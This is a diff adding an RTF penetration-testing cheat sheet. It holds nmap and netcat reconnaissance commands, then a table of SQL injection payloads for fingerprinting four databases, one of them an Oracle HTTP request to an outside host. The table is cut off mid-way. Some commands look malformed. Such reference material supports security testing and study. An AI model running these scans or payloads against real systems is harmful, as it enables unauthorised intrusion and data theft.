@@ -1,0 +1,1070 @@
+{\rtf1\ansi\ansicpg1252\cocoartf2709
+\cocoatextscaling0\cocoaplatform0{\fonttbl\f0\fswiss\fcharset0 Helvetica-Bold;\f1\froman\fcharset0 Times-Roman;\f2\froman\fcharset0 Times-Bold;
+\f3\fswiss\fcharset0 Helvetica;\f4\froman\fcharset0 TimesNewRomanPSMT;\f5\froman\fcharset0 Times-Italic;
+}
+{\colortbl;\red255\green255\blue255;\red0\green0\blue0;\red42\green44\blue51;\red249\green249\blue249;
+\red255\green255\blue255;\red0\green0\blue0;\red74\green74\blue74;\red246\green246\blue246;\red147\green0\blue147;
+\red66\green147\blue62;\red178\green113\blue6;\red133\green85\blue4;\red143\green144\blue150;}
+{\*\expandedcolortbl;;\cssrgb\c0\c0\c0;\cssrgb\c21961\c22745\c25882;\cssrgb\c98039\c98039\c98039;
+\cssrgb\c100000\c100000\c100000;\cssrgb\c0\c0\c0\c84706;\cssrgb\c36078\c36078\c36078;\cssrgb\c97255\c97255\c97255;\cssrgb\c65098\c14902\c64314;
+\cssrgb\c31373\c63137\c30980;\cssrgb\c75686\c51765\c392;\cssrgb\c59608\c40784\c392;\cssrgb\c62745\c63137\c65490;}
+\paperw11900\paperh16840\margl1440\margr1440\vieww28600\viewh18000\viewkind0
+\pard\tx720\tx1440\tx2160\tx2880\tx3600\tx4320\tx5040\tx5760\tx6480\tx7200\tx7920\tx8640\pardirnatural\partightenfactor0
+
+\f0\b\fs24 \cf0 Chapter 3\
+\
+Nmap Commands\
+\
+\pard\pardeftab720\sa133\partightenfactor0
+
+\f1\b0\fs26\fsmilli13333 \cf2 \expnd0\expndtw0\kerning0
+nmap -n -A -PN -p- -T Agressive -iL nmap.targetlist -oX nmap.syn.results.xml\
+nmap -sU -PN -v -O -p 1-30000 -T polite -iL nmap.targetlist > nmap.udp.results\
+nmap -sV -PN -v -p 21,22,23,25,53,80,443,161 -iL nmap.targets > nmap.version.results\
+nmap -A -sS -PN -n --script:all ip_address --reason\
+nc -v -n IP_Address port\
+nc -v -w 2 -z IP_Address port_range/port_number\
+amap -bqv 192.168.1.1 80\
+amap [-A|-B|-P|-W] [-1buSRHUdqv] [[-m] -o <file>] [-D <file>] [-t/-T sec] [-c cons] [-C retries] [-p proto] [-i <file>] [target port [port] ...]\
+xprobe2 192.168.1.1\
+/sinfp.pl -ai 192.168.0.1 -p 445\
+nbtscan [-v] [-d] [-e] [-l] [-t timeout] [-b bandwidth] [-r] [-q] [-s separator] [-m retransmits] (-f filename) | (<scan_range>) Arrow Link\
+hping ip_address\
+scanrand ip_address:all\
+unicornscan [options `b:B:d:De:EFhi:L:m:M:pP:q:r:R:s:St:T:w:W:vVZ:' ] IP_ADDRESS/ CIDR_NET_MASK: S-E\
+netenum network/netmask timeout\
+fping -a -d hostname/ (Network/Subnet_Mask)\
+\
+
+\f2\b Chapter 8
+\f1\b0 \
+
+\f2\b Testing SQL Injection\
+\pard\pardeftab720\partightenfactor0
+
+\f1\b0\fs28 \cf3 \cb4 \
+\
+
+\itap1\trowd \taflags1 \trgaph108\trleft-108 \trwWidth10740\trftsWidth3 \trmarl1973 \trbrdrt\brdrnil \trbrdrl\brdrnil \trbrdrr\brdrnil 
+\clmgf \clvertalt \clshdrawnil \clwWidth10412\clftsWidth3 \clbrdrt\brdrs\brdrw20\brdrcf6 \clbrdrl\brdrs\brdrw20\brdrcf6 \clbrdrb\brdrs\brdrw20\brdrcf6 \clbrdrr\brdrs\brdrw20\brdrcf6 \clpadl144 \clpadr144 \gaph\cellx4320
+\clmrg \clvertalt \clshdrawnil \clwWidth10412\clftsWidth3 \clbrdrt\brdrs\brdrw20\brdrcf6 \clbrdrl\brdrs\brdrw20\brdrcf6 \clbrdrb\brdrs\brdrw20\brdrcf6 \clbrdrr\brdrs\brdrw20\brdrcf6 \clpadl144 \clpadr144 \gaph\cellx8640
+\pard\intbl\itap1\pardeftab720\sl368\sa133\qj\partightenfactor0
+
+\fs32 \cf2 \cb5 String concatenation
+\fs29\fsmilli14667 \cell 
+\pard\intbl\itap1\cell \row
+
+\itap1\trowd \taflags1 \trgaph108\trleft-108 \trwWidth10740\trftsWidth3 \trmarl1973 \trbrdrl\brdrnil \trbrdrr\brdrnil 
+\clvertalt \clshdrawnil \clwWidth3462\clftsWidth3 \clbrdrt\brdrnil \clbrdrl\brdrs\brdrw20\brdrcf6 \clbrdrb\brdrs\brdrw20\brdrcf6 \clbrdrr\brdrs\brdrw20\brdrcf6 \clpadl144 \clpadr144 \gaph\cellx4320
+\clvertalt \clshdrawnil \clwWidth6642\clftsWidth3 \clbrdrt\brdrnil \clbrdrl\brdrnil \clbrdrb\brdrs\brdrw20\brdrcf6 \clbrdrr\brdrs\brdrw20\brdrcf6 \clpadl144 \clpadr144 \gaph\cellx8640
+\pard\intbl\itap1\pardeftab720\sl368\sa133\qj\partightenfactor0
+
+\fs32 \cf2 Oracle
+\fs29\fsmilli14667 \cell 
+\pard\intbl\itap1\pardeftab720\sl368\sa133\qj\partightenfactor0
+
+\fs32 \cf2 'abc'||'xyz'
+\fs29\fsmilli14667 \cell \row
+
+\itap1\trowd \taflags1 \trgaph108\trleft-108 \trwWidth10740\trftsWidth3 \trmarl1973 \trbrdrl\brdrnil \trbrdrr\brdrnil 
+\clvertalt \clshdrawnil \clwWidth3462\clftsWidth3 \clbrdrt\brdrnil \clbrdrl\brdrs\brdrw20\brdrcf6 \clbrdrb\brdrs\brdrw20\brdrcf6 \clbrdrr\brdrs\brdrw20\brdrcf6 \clpadl144 \clpadr144 \gaph\cellx4320
+\clvertalt \clshdrawnil \clwWidth6642\clftsWidth3 \clbrdrt\brdrnil \clbrdrl\brdrnil \clbrdrb\brdrs\brdrw20\brdrcf6 \clbrdrr\brdrs\brdrw20\brdrcf6 \clpadl144 \clpadr144 \gaph\cellx8640
+\pard\intbl\itap1\pardeftab720\sl368\sa133\qj\partightenfactor0
+
+\fs32 \cf2 MS-SQL
+\fs29\fsmilli14667 \cell 
+\pard\intbl\itap1\pardeftab720\sl368\sa133\qj\partightenfactor0
+
+\fs32 \cf2 'abc'+'xyz'
+\fs29\fsmilli14667 \cell \row
+
+\itap1\trowd \taflags1 \trgaph108\trleft-108 \trwWidth10740\trftsWidth3 \trmarl1973 \trbrdrl\brdrnil \trbrdrr\brdrnil 
+\clvertalt \clshdrawnil \clwWidth3462\clftsWidth3 \clbrdrt\brdrnil \clbrdrl\brdrs\brdrw20\brdrcf6 \clbrdrb\brdrs\brdrw20\brdrcf6 \clbrdrr\brdrs\brdrw20\brdrcf6 \clpadl144 \clpadr144 \gaph\cellx4320
+\clvertalt \clshdrawnil \clwWidth6642\clftsWidth3 \clbrdrt\brdrnil \clbrdrl\brdrnil \clbrdrb\brdrs\brdrw20\brdrcf6 \clbrdrr\brdrs\brdrw20\brdrcf6 \clpadl144 \clpadr144 \gaph\cellx8640
+\pard\intbl\itap1\pardeftab720\sl368\sa133\qj\partightenfactor0
+
+\fs32 \cf2 My SQL
+\fs29\fsmilli14667 \cell 
+\pard\intbl\itap1\pardeftab720\sl368\sa133\qj\partightenfactor0
+
+\fs32 \cf2 'abc' 'xyz'
+\fs29\fsmilli14667 \
+
+\fs32 CONCAT('abc', 'xyz')
+\fs29\fsmilli14667 \cell \row
+
+\itap1\trowd \taflags1 \trgaph108\trleft-108 \trwWidth10740\trftsWidth3 \trmarl1973 \trbrdrl\brdrnil \trbrdrr\brdrnil 
+\clvertalt \clshdrawnil \clwWidth3462\clftsWidth3 \clbrdrt\brdrnil \clbrdrl\brdrs\brdrw20\brdrcf6 \clbrdrb\brdrs\brdrw20\brdrcf6 \clbrdrr\brdrs\brdrw20\brdrcf6 \clpadl144 \clpadr144 \gaph\cellx4320
+\clvertalt \clshdrawnil \clwWidth6642\clftsWidth3 \clbrdrt\brdrnil \clbrdrl\brdrnil \clbrdrb\brdrs\brdrw20\brdrcf6 \clbrdrr\brdrs\brdrw20\brdrcf6 \clpadl144 \clpadr144 \gaph\cellx8640
+\pard\intbl\itap1\pardeftab720\sl368\sa133\qj\partightenfactor0
+
+\fs32 \cf2 PostgreSQL
+\fs29\fsmilli14667 \cell 
+\pard\intbl\itap1\pardeftab720\sl368\sa133\qj\partightenfactor0
+
+\fs32 \cf2 'abc'||'xyz'
+\fs29\fsmilli14667 \cell \row
+
+\itap1\trowd \taflags1 \trgaph108\trleft-108 \trwWidth10740\trftsWidth3 \trmarl1973 \trbrdrl\brdrnil \trbrdrr\brdrnil 
+\clmgf \clvertalt \clshdrawnil \clwWidth10412\clftsWidth3 \clbrdrt\brdrnil \clbrdrl\brdrs\brdrw20\brdrcf6 \clbrdrb\brdrs\brdrw20\brdrcf6 \clbrdrr\brdrs\brdrw20\brdrcf6 \clpadl144 \clpadr144 \gaph\cellx4320
+\clmrg \clvertalt \clshdrawnil \clwWidth10412\clftsWidth3 \clbrdrt\brdrnil \clbrdrl\brdrs\brdrw20\brdrcf6 \clbrdrb\brdrs\brdrw20\brdrcf6 \clbrdrr\brdrs\brdrw20\brdrcf6 \clpadl144 \clpadr144 \gaph\cellx8640
+\pard\intbl\itap1\pardeftab720\sl368\sa133\qj\partightenfactor0
+
+\fs32 \cf2 SUBSTRING
+\fs29\fsmilli14667 \cell 
+\pard\intbl\itap1\cell \row
+
+\itap1\trowd \taflags1 \trgaph108\trleft-108 \trwWidth10740\trftsWidth3 \trmarl1973 \trbrdrl\brdrnil \trbrdrr\brdrnil 
+\clvertalt \clshdrawnil \clwWidth3462\clftsWidth3 \clbrdrt\brdrnil \clbrdrl\brdrs\brdrw20\brdrcf6 \clbrdrb\brdrs\brdrw20\brdrcf6 \clbrdrr\brdrs\brdrw20\brdrcf6 \clpadl144 \clpadr144 \gaph\cellx4320
+\clvertalt \clshdrawnil \clwWidth6642\clftsWidth3 \clbrdrt\brdrnil \clbrdrl\brdrnil \clbrdrb\brdrs\brdrw20\brdrcf6 \clbrdrr\brdrs\brdrw20\brdrcf6 \clpadl144 \clpadr144 \gaph\cellx8640
+\pard\intbl\itap1\pardeftab720\sl368\sa133\qj\partightenfactor0
+
+\fs32 \cf2 Oracle
+\fs29\fsmilli14667 \cell 
+\pard\intbl\itap1\pardeftab720\sl368\sa133\qj\partightenfactor0
+
+\fs32 \cf2 SUBSTR('abcxyz', 4, 2)
+\fs29\fsmilli14667 \cell \row
+
+\itap1\trowd \taflags1 \trgaph108\trleft-108 \trwWidth10740\trftsWidth3 \trmarl1973 \trbrdrl\brdrnil \trbrdrr\brdrnil 
+\clvertalt \clshdrawnil \clwWidth3462\clftsWidth3 \clbrdrt\brdrnil \clbrdrl\brdrs\brdrw20\brdrcf6 \clbrdrb\brdrs\brdrw20\brdrcf6 \clbrdrr\brdrs\brdrw20\brdrcf6 \clpadl144 \clpadr144 \gaph\cellx4320
+\clvertalt \clshdrawnil \clwWidth6642\clftsWidth3 \clbrdrt\brdrnil \clbrdrl\brdrnil \clbrdrb\brdrs\brdrw20\brdrcf6 \clbrdrr\brdrs\brdrw20\brdrcf6 \clpadl144 \clpadr144 \gaph\cellx8640
+\pard\intbl\itap1\pardeftab720\sl368\sa133\qj\partightenfactor0
+
+\fs32 \cf2 MS-SQL
+\fs29\fsmilli14667 \cell 
+\pard\intbl\itap1\pardeftab720\sl368\sa133\qj\partightenfactor0
+
+\fs32 \cf2 SUBSTRING('abcxyz', 4, 2)
+\fs29\fsmilli14667 \cell \row
+
+\itap1\trowd \taflags1 \trgaph108\trleft-108 \trwWidth10740\trftsWidth3 \trmarl1973 \trbrdrl\brdrnil \trbrdrr\brdrnil 
+\clvertalt \clshdrawnil \clwWidth3462\clftsWidth3 \clbrdrt\brdrnil \clbrdrl\brdrs\brdrw20\brdrcf6 \clbrdrb\brdrs\brdrw20\brdrcf6 \clbrdrr\brdrs\brdrw20\brdrcf6 \clpadl144 \clpadr144 \gaph\cellx4320
+\clvertalt \clshdrawnil \clwWidth6642\clftsWidth3 \clbrdrt\brdrnil \clbrdrl\brdrnil \clbrdrb\brdrs\brdrw20\brdrcf6 \clbrdrr\brdrs\brdrw20\brdrcf6 \clpadl144 \clpadr144 \gaph\cellx8640
+\pard\intbl\itap1\pardeftab720\sl368\sa133\qj\partightenfactor0
+
+\fs32 \cf2 My SQL
+\fs29\fsmilli14667 \cell 
+\pard\intbl\itap1\pardeftab720\sl368\sa133\qj\partightenfactor0
+
+\fs32 \cf2 SUBSTRING('abcxyz', 4, 2)
+\fs29\fsmilli14667 \cell \row
+
+\itap1\trowd \taflags1 \trgaph108\trleft-108 \trwWidth10740\trftsWidth3 \trmarl1973 \trbrdrl\brdrnil \trbrdrr\brdrnil 
+\clvertalt \clshdrawnil \clwWidth3462\clftsWidth3 \clbrdrt\brdrnil \clbrdrl\brdrs\brdrw20\brdrcf6 \clbrdrb\brdrs\brdrw20\brdrcf6 \clbrdrr\brdrs\brdrw20\brdrcf6 \clpadl144 \clpadr144 \gaph\cellx4320
+\clvertalt \clshdrawnil \clwWidth6642\clftsWidth3 \clbrdrt\brdrnil \clbrdrl\brdrnil \clbrdrb\brdrs\brdrw20\brdrcf6 \clbrdrr\brdrs\brdrw20\brdrcf6 \clpadl144 \clpadr144 \gaph\cellx8640
+\pard\intbl\itap1\pardeftab720\sl368\sa133\qj\partightenfactor0
+
+\fs32 \cf2 PostgreSQL
+\fs29\fsmilli14667 \cell 
+\pard\intbl\itap1\pardeftab720\sl368\sa133\qj\partightenfactor0
+
+\fs32 \cf2 SUBSTR('abcxyz', 4, 2)
+\fs29\fsmilli14667 \cell \row
+
+\itap1\trowd \taflags1 \trgaph108\trleft-108 \trwWidth10740\trftsWidth3 \trmarl1973 \trbrdrl\brdrnil \trbrdrr\brdrnil 
+\clmgf \clvertalt \clshdrawnil \clwWidth10412\clftsWidth3 \clbrdrt\brdrnil \clbrdrl\brdrs\brdrw20\brdrcf6 \clbrdrb\brdrs\brdrw20\brdrcf6 \clbrdrr\brdrs\brdrw20\brdrcf6 \clpadl144 \clpadr144 \gaph\cellx4320
+\clmrg \clvertalt \clshdrawnil \clwWidth10412\clftsWidth3 \clbrdrt\brdrnil \clbrdrl\brdrs\brdrw20\brdrcf6 \clbrdrb\brdrs\brdrw20\brdrcf6 \clbrdrr\brdrs\brdrw20\brdrcf6 \clpadl144 \clpadr144 \gaph\cellx8640
+\pard\intbl\itap1\pardeftab720\sl368\sa133\qj\partightenfactor0
+
+\fs32 \cf2 Retrieve current database user
+\fs29\fsmilli14667 \cell 
+\pard\intbl\itap1\cell \row
+
+\itap1\trowd \taflags1 \trgaph108\trleft-108 \trwWidth10740\trftsWidth3 \trmarl1973 \trbrdrl\brdrnil \trbrdrr\brdrnil 
+\clvertalt \clshdrawnil \clwWidth3462\clftsWidth3 \clbrdrt\brdrnil \clbrdrl\brdrs\brdrw20\brdrcf6 \clbrdrb\brdrs\brdrw20\brdrcf6 \clbrdrr\brdrs\brdrw20\brdrcf6 \clpadl144 \clpadr144 \gaph\cellx4320
+\clvertalt \clshdrawnil \clwWidth6642\clftsWidth3 \clbrdrt\brdrnil \clbrdrl\brdrnil \clbrdrb\brdrs\brdrw20\brdrcf6 \clbrdrr\brdrs\brdrw20\brdrcf6 \clpadl144 \clpadr144 \gaph\cellx8640
+\pard\intbl\itap1\pardeftab720\sl368\sa133\qj\partightenfactor0
+
+\fs32 \cf2 Oracle
+\fs29\fsmilli14667 \cell 
+\pard\intbl\itap1\pardeftab720\sl368\sa133\qj\partightenfactor0
+
+\fs32 \cf2 Select Sys.login_user from dual SELECT
+\fs29\fsmilli14667 \
+
+\fs32 user FROM dual SYS_CONTEXT('USERENV',
+\fs29\fsmilli14667 \
+
+\fs32 'SESSION_USER')
+\fs29\fsmilli14667 \cell \row
+
+\itap1\trowd \taflags1 \trgaph108\trleft-108 \trwWidth10740\trftsWidth3 \trmarl1973 \trbrdrl\brdrnil \trbrdrr\brdrnil 
+\clvertalt \clshdrawnil \clwWidth3462\clftsWidth3 \clbrdrt\brdrnil \clbrdrl\brdrs\brdrw20\brdrcf6 \clbrdrb\brdrs\brdrw20\brdrcf6 \clbrdrr\brdrs\brdrw20\brdrcf6 \clpadl144 \clpadr144 \gaph\cellx4320
+\clvertalt \clshdrawnil \clwWidth6642\clftsWidth3 \clbrdrt\brdrnil \clbrdrl\brdrnil \clbrdrb\brdrs\brdrw20\brdrcf6 \clbrdrr\brdrs\brdrw20\brdrcf6 \clpadl144 \clpadr144 \gaph\cellx8640
+\pard\intbl\itap1\pardeftab720\sl368\sa133\qj\partightenfactor0
+
+\fs32 \cf2 MS-SQL
+\fs29\fsmilli14667 \cell 
+\pard\intbl\itap1\pardeftab720\sl368\sa133\qj\partightenfactor0
+
+\fs32 \cf2 select suser_sname()
+\fs29\fsmilli14667 \cell \row
+
+\itap1\trowd \taflags1 \trgaph108\trleft-108 \trwWidth10740\trftsWidth3 \trmarl1973 \trbrdrl\brdrnil \trbrdrr\brdrnil 
+\clvertalt \clshdrawnil \clwWidth3462\clftsWidth3 \clbrdrt\brdrnil \clbrdrl\brdrs\brdrw20\brdrcf6 \clbrdrb\brdrs\brdrw20\brdrcf6 \clbrdrr\brdrs\brdrw20\brdrcf6 \clpadl144 \clpadr144 \gaph\cellx4320
+\clvertalt \clshdrawnil \clwWidth6642\clftsWidth3 \clbrdrt\brdrnil \clbrdrl\brdrnil \clbrdrb\brdrs\brdrw20\brdrcf6 \clbrdrr\brdrs\brdrw20\brdrcf6 \clpadl144 \clpadr144 \gaph\cellx8640
+\pard\intbl\itap1\pardeftab720\sl368\sa133\qj\partightenfactor0
+
+\fs32 \cf2 My SQL
+\fs29\fsmilli14667 \cell 
+\pard\intbl\itap1\pardeftab720\sl368\sa133\qj\partightenfactor0
+
+\fs32 \cf2 SELECT user()
+\fs29\fsmilli14667 \cell \row
+
+\itap1\trowd \taflags1 \trgaph108\trleft-108 \trwWidth10740\trftsWidth3 \trmarl1973 \trbrdrl\brdrnil \trbrdrr\brdrnil 
+\clmgf \clvertalt \clshdrawnil \clwWidth10412\clftsWidth3 \clbrdrt\brdrnil \clbrdrl\brdrs\brdrw20\brdrcf6 \clbrdrb\brdrs\brdrw20\brdrcf6 \clbrdrr\brdrs\brdrw20\brdrcf6 \clpadl144 \clpadr144 \gaph\cellx4320
+\clmrg \clvertalt \clshdrawnil \clwWidth10412\clftsWidth3 \clbrdrt\brdrnil \clbrdrl\brdrs\brdrw20\brdrcf6 \clbrdrb\brdrs\brdrw20\brdrcf6 \clbrdrr\brdrs\brdrw20\brdrcf6 \clpadl144 \clpadr144 \gaph\cellx8640
+\pard\intbl\itap1\pardeftab720\sl368\sa133\qj\partightenfactor0
+
+\fs32 \cf2 Triggering time delays
+\fs29\fsmilli14667 \cell 
+\pard\intbl\itap1\cell \row
+
+\itap1\trowd \taflags1 \trgaph108\trleft-108 \trwWidth10740\trftsWidth3 \trmarl1973 \trbrdrl\brdrnil \trbrdrr\brdrnil 
+\clvertalt \clshdrawnil \clwWidth3462\clftsWidth3 \clbrdrt\brdrnil \clbrdrl\brdrs\brdrw20\brdrcf6 \clbrdrb\brdrs\brdrw20\brdrcf6 \clbrdrr\brdrs\brdrw20\brdrcf6 \clpadl144 \clpadr144 \gaph\cellx4320
+\clvertalt \clshdrawnil \clwWidth6642\clftsWidth3 \clbrdrt\brdrnil \clbrdrl\brdrnil \clbrdrb\brdrs\brdrw20\brdrcf6 \clbrdrr\brdrs\brdrw20\brdrcf6 \clpadl144 \clpadr144 \gaph\cellx8640
+\pard\intbl\itap1\pardeftab720\sl368\sa133\qj\partightenfactor0
+
+\fs32 \cf2 Oracle
+\fs29\fsmilli14667 \cell 
+\pard\intbl\itap1\pardeftab720\sl368\sa133\qj\partightenfactor0
+
+\fs32 \cf2 Utl_Http.request('http://testserver.com'))
+\fs29\fsmilli14667 \cell \row
+
+\itap1\trowd \taflags1 \trgaph108\trleft-108 \trwWidth10740\trftsWidth3 \trmarl1973 \trbrdrl\brdrnil \trbrdrr\brdrnil 
+\clvertalt \clshdrawnil \clwWidth3462\clftsWidth3 \clbrdrt\brdrnil \clbrdrl\brdrs\brdrw20\brdrcf6 \clbrdrb\brdrs\brdrw20\brdrcf6 \clbrdrr\brdrs\brdrw20\brdrcf6 \clpadl144 \clpadr144 \gaph\cellx4320
+\clvertalt \clshdrawnil \clwWidth6642\clftsWidth3 \clbrdrt\brdrnil \clbrdrl\brdrnil \clbrdrb\brdrs\brdrw20\brdrcf6 \clbrdrr\brdrs\brdrw20\brdrcf6 \clpadl144 \clpadr144 \gaph\cellx8640
+\pard\intbl\itap1\pardeftab720\sl368\sa133\qj\partightenfactor0
+
+\fs32 \cf2 MS-SQL
+\fs29\fsmilli14667 \cell 
+\pard\intbl\itap1\pardeftab720\sl368\sa133\qj\partightenfactor0
+
+\fs32 \cf2 WAITFOR DELAY '0:0:10'
+\fs29\fsmilli14667 \cell \row
+
+\itap1\trowd \taflags1 \trgaph108\trleft-108 \trwWidth10740\trftsWidth3 \trmarl1973 \trbrdrl\brdrnil \trbrdrr\brdrnil 
+\clvertalt \clshdrawnil \clwWidth3462\clftsWidth3 \clbrdrt\brdrnil \clbrdrl\brdrs\brdrw20\brdrcf6 \clbrdrb\brdrs\brdrw20\brdrcf6 \clbrdrr\brdrs\brdrw20\brdrcf6 \clpadl144 \clpadr144 \gaph\cellx4320
+\clvertalt \clshdrawnil \clwWidth6642\clftsWidth3 \clbrdrt\brdrnil \clbrdrl\brdrnil \clbrdrb\brdrs\brdrw20\brdrcf6 \clbrdrr\brdrs\brdrw20\brdrcf6 \clpadl144 \clpadr144 \gaph\cellx8640
+\pard\intbl\itap1\pardeftab720\sl368\sa133\qj\partightenfactor0
+
+\fs32 \cf2 My SQL
+\fs29\fsmilli14667 \cell 
+\pard\intbl\itap1\pardeftab720\sl368\sa133\qj\partightenfactor0
+
+\fs32 \cf2 sleep(100)
+\fs29\fsmilli14667 \cell \row
+
+\itap1\trowd \taflags1 \trgaph108\trleft-108 \trwWidth10740\trftsWidth3 \trmarl1973 \trbrdrl\brdrnil \trbrdrr\brdrnil 
+\clvertalt \clshdrawnil \clwWidth3462\clftsWidth3 \clbrdrt\brdrnil \clbrdrl\brdrs\brdrw20\brdrcf6 \clbrdrb\brdrs\brdrw20\brdrcf6 \clbrdrr\brdrs\brdrw20\brdrcf6 \clpadl144 \clpadr144 \gaph\cellx4320
+\clvertalt \clshdrawnil \clwWidth6642\clftsWidth3 \clbrdrt\brdrnil \clbrdrl\brdrnil \clbrdrb\brdrs\brdrw20\brdrcf6 \clbrdrr\brdrs\brdrw20\brdrcf6 \clpadl144 \clpadr144 \gaph\cellx8640
+\pard\intbl\itap1\pardeftab720\sl368\sa133\qj\partightenfactor0
+
+\fs32 \cf2 PostgreSQL
+\fs29\fsmilli14667 \cell 
+\pard\intbl\itap1\pardeftab720\sl368\sa133\qj\partightenfactor0
+
+\fs32 \cf2 SELECT pg_sleep(10)
+\fs29\fsmilli14667 \cell \row
+
+\itap1\trowd \taflags1 \trgaph108\trleft-108 \trwWidth10740\trftsWidth3 \trmarl1973 \trbrdrl\brdrnil \trbrdrr\brdrnil 
+\clmgf \clvertalt \clshdrawnil \clwWidth10412\clftsWidth3 \clbrdrt\brdrnil \clbrdrl\brdrs\brdrw20\brdrcf6 \clbrdrb\brdrs\brdrw20\brdrcf6 \clbrdrr\brdrs\brdrw20\brdrcf6 \clpadl144 \clpadr144 \gaph\cellx4320
+\clmrg \clvertalt \clshdrawnil \clwWidth10412\clftsWidth3 \clbrdrt\brdrnil \clbrdrl\brdrs\brdrw20\brdrcf6 \clbrdrb\brdrs\brdrw20\brdrcf6 \clbrdrr\brdrs\brdrw20\brdrcf6 \clpadl144 \clpadr144 \gaph\cellx8640
+\pard\intbl\itap1\pardeftab720\sl368\sa133\qj\partightenfactor0
+
+\fs32 \cf2 Retrieve database version
+\fs29\fsmilli14667 \cell 
+\pard\intbl\itap1\cell \row
+
+\itap1\trowd \taflags1 \trgaph108\trleft-108 \trwWidth10740\trftsWidth3 \trmarl1973 \trbrdrl\brdrnil \trbrdrr\brdrnil 
+\clvertalt \clshdrawnil \clwWidth3462\clftsWidth3 \clbrdrt\brdrnil \clbrdrl\brdrs\brdrw20\brdrcf6 \clbrdrb\brdrs\brdrw20\brdrcf6 \clbrdrr\brdrs\brdrw20\brdrcf6 \clpadl144 \clpadr144 \gaph\cellx4320
+\clvertalt \clshdrawnil \clwWidth6642\clftsWidth3 \clbrdrt\brdrnil \clbrdrl\brdrnil \clbrdrb\brdrs\brdrw20\brdrcf6 \clbrdrr\brdrs\brdrw20\brdrcf6 \clpadl144 \clpadr144 \gaph\cellx8640
+\pard\intbl\itap1\pardeftab720\sl368\sa133\qj\partightenfactor0
+
+\fs32 \cf2 Oracle
+\fs29\fsmilli14667 \cell 
+\pard\intbl\itap1\pardeftab720\sl368\sa133\qj\partightenfactor0
+
+\fs32 \cf2 SELECT banner FROM v$version
+\fs29\fsmilli14667 \cell \row
+
+\itap1\trowd \taflags1 \trgaph108\trleft-108 \trwWidth10740\trftsWidth3 \trmarl1973 \trbrdrl\brdrnil \trbrdrr\brdrnil 
+\clvertalt \clshdrawnil \clwWidth3462\clftsWidth3 \clbrdrt\brdrnil \clbrdrl\brdrs\brdrw20\brdrcf6 \clbrdrb\brdrs\brdrw20\brdrcf6 \clbrdrr\brdrs\brdrw20\brdrcf6 \clpadl144 \clpadr144 \gaph\cellx4320
+\clvertalt \clshdrawnil \clwWidth6642\clftsWidth3 \clbrdrt\brdrnil \clbrdrl\brdrnil \clbrdrb\brdrs\brdrw20\brdrcf6 \clbrdrr\brdrs\brdrw20\brdrcf6 \clpadl144 \clpadr144 \gaph\cellx8640
+\pard\intbl\itap1\pardeftab720\sl368\sa133\qj\partightenfactor0
+
+\fs32 \cf2 MS-SQL
+\fs29\fsmilli14667 \cell 
+\pard\intbl\itap1\pardeftab720\sl368\sa133\qj\partightenfactor0
+
+\fs32 \cf2 SELECT @@version
+\fs29\fsmilli14667 \cell \row
+
+\itap1\trowd \taflags1 \trgaph108\trleft-108 \trwWidth10740\trftsWidth3 \trmarl1973 \trbrdrl\brdrnil \trbrdrr\brdrnil 
+\clvertalt \clshdrawnil \clwWidth3462\clftsWidth3 \clbrdrt\brdrnil \clbrdrl\brdrs\brdrw20\brdrcf6 \clbrdrb\brdrs\brdrw20\brdrcf6 \clbrdrr\brdrs\brdrw20\brdrcf6 \clpadl144 \clpadr144 \gaph\cellx4320
+\clvertalt \clshdrawnil \clwWidth6642\clftsWidth3 \clbrdrt\brdrnil \clbrdrl\brdrnil \clbrdrb\brdrs\brdrw20\brdrcf6 \clbrdrr\brdrs\brdrw20\brdrcf6 \clpadl144 \clpadr144 \gaph\cellx8640
+\pard\intbl\itap1\pardeftab720\sl368\sa133\qj\partightenfactor0
+
+\fs32 \cf2 My SQL
+\fs29\fsmilli14667 \cell 
+\pard\intbl\itap1\pardeftab720\sl368\sa133\qj\partightenfactor0
+
+\fs32 \cf2 SELECT @@version
+\fs29\fsmilli14667 \cell \row
+
+\itap1\trowd \taflags1 \trgaph108\trleft-108 \trwWidth10740\trftsWidth3 \trmarl1973 \trbrdrl\brdrnil \trbrdrr\brdrnil 
+\clvertalt \clshdrawnil \clwWidth3462\clftsWidth3 \clbrdrt\brdrnil \clbrdrl\brdrs\brdrw20\brdrcf6 \clbrdrb\brdrs\brdrw20\brdrcf6 \clbrdrr\brdrs\brdrw20\brdrcf6 \clpadl144 \clpadr144 \gaph\cellx4320
+\clvertalt \clshdrawnil \clwWidth6642\clftsWidth3 \clbrdrt\brdrnil \clbrdrl\brdrnil \clbrdrb\brdrs\brdrw20\brdrcf6 \clbrdrr\brdrs\brdrw20\brdrcf6 \clpadl144 \clpadr144 \gaph\cellx8640
+\pard\intbl\itap1\pardeftab720\sl368\sa133\qj\partightenfactor0
+
+\fs32 \cf2 PostgreSQL
+\fs29\fsmilli14667 \cell 
+\pard\intbl\itap1\pardeftab720\sl368\sa133\qj\partightenfactor0
+
+\fs32 \cf2 SELECT version()
+\fs29\fsmilli14667 \cell \row
+
+\itap1\trowd \taflags1 \trgaph108\trleft-108 \trwWidth10740\trftsWidth3 \trmarl1973 \trbrdrl\brdrnil \trbrdrr\brdrnil 
+\clmgf \clvertalt \clshdrawnil \clwWidth10412\clftsWidth3 \clbrdrt\brdrnil \clbrdrl\brdrs\brdrw20\brdrcf6 \clbrdrb\brdrs\brdrw20\brdrcf6 \clbrdrr\brdrs\brdrw20\brdrcf6 \clpadl144 \clpadr144 \gaph\cellx4320
+\clmrg \clvertalt \clshdrawnil \clwWidth10412\clftsWidth3 \clbrdrt\brdrnil \clbrdrl\brdrs\brdrw20\brdrcf6 \clbrdrb\brdrs\brdrw20\brdrcf6 \clbrdrr\brdrs\brdrw20\brdrcf6 \clpadl144 \clpadr144 \gaph\cellx8640
+\pard\intbl\itap1\pardeftab720\sl368\sa133\qj\partightenfactor0
+
+\fs32 \cf2 Retrieve database contents
+\fs29\fsmilli14667 \cell 
+\pard\intbl\itap1\cell \row
+
+\itap1\trowd \taflags1 \trgaph108\trleft-108 \trwWidth10740\trftsWidth3 \trmarl1973 \trbrdrl\brdrnil \trbrdrr\brdrnil 
+\clvertalt \clshdrawnil \clwWidth3462\clftsWidth3 \clbrdrt\brdrnil \clbrdrl\brdrs\brdrw20\brdrcf6 \clbrdrb\brdrs\brdrw20\brdrcf6 \clbrdrr\brdrs\brdrw20\brdrcf6 \clpadl144 \clpadr144 \gaph\cellx4320
